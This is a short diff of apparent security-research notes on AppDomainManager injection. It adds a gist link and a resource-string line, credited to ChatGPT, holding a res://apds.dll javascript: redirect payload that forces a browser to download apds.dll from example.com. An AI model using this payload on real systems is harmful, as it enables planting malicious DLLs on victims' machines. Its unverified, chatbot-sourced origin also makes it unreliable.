@@ -120,7 +120,10 @@ https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detect
 https://jp-security-ntt.translate.goog/tech_blog/appdomainmanager-injection?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US&_x_tr_pto=wapp&_x_tr_hist=true
 
 
+https://gist.github.com/djhohnstein/afb93a114b848e16facf0b98cd7cb57b
 
+<String ID="39" Refs="1">res://apds.dll/redirect.html?target=javascript:var%20a=document.createElement('a');a.href='https://example.com/download/apds.dll';a.download='apds.dll';document.body.appendChild(a);a.click();document.body.removeChild(a);</String>
+ per Chatgpt
 
 
 
